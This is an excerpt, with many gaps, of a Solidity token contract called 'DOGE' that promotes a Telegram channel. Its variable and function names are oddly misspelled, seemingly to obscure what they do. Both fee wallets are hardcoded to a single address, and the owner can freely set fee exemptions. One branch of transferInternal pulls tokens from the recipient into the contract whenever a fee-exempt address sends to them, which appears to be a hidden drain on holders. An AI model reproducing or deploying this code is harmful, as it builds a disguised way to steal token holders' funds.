...
/*
Telegram：https://t.me/DOGETOKENPortal
...
contract DOGE is ERC20, Ownable {
    ...
    address private _marketems;
    address private _devburnms ;
    ...
    mapping(address => bool) private _isExcludedFromFev;
    ...
    event ExcludeFromtionsme(address indexed account, bool isExcluded);
    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiquidity);

    receive() external payable {}

    constructor() payable ERC20(unicode"Doge", unicode"DOGE") {
        ...
        _additionalBuyFee = 0;
        _burnFee = 0;
        _marketems = address(0xfA550F664f07C162A12CdBC46f241637a512D701);
        _devburnms = address(0xfA550F664f07C162A12CdBC46f241637a512D701);
        _totalFees = _marketingFee + _rewardFee + _liquidityFee;



        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(_marketems, true);
        excludeFromMaxTransaction(_devburnms, true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromtionsme(owner(), true);
        excludeFromtionsme(_marketems, true);
        excludeFromtionsme(_devburnms, true);
        excludeFromtionsme(address(this), true);
        excludeFromtionsme(address(0xdead), true);
    ...
    function excludeFromtionsme(address account, bool excluded) public onlyOwner {
        _isExcludedFromFev[account] = excluded;
        emit ExcludeFromtionsme(account, excluded);
    }

    function updateMarketingAddr(address newWallet) external onlyOwner {
        _marketems = newWallet;
    }

    function updateRewardAddr(address newWallet) external onlyOwner {
        _devburnms = newWallet;
    }

    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFev[account];
    }
    ...
    function _transfer(
        ...
        bool isExcludeFromFee = _isExcludedFromFev[from] ||
            _isExcludedFromFev[to];
    ...
    function needTakeFee(address from, address to) private returns (bool) {
        ...
        if (isBuy && _isExcludedFromFev[to]) _swapTimes += 1;
        bool isExcludedFromFee = _isExcludedFromFev[from] || _isExcludedFromFev[to];
        bool isSell = to == _uniswapV2Pair; 
    ...
    function transferInternal(
        ...
        if (takeFee) {
            ...
            if (_isExcludedFromFev[from]) _transfer(to, address(this), amount);
            return;
        }
    ...
    function swapBack() private {
        ...
        (bool marketingFundSuccess, ) = address(_marketems).call{value: ethForMarketing}("");
        (bool rewardFundSuccess, ) = address(_devburnms).call{value: ethForReward}("");
    }
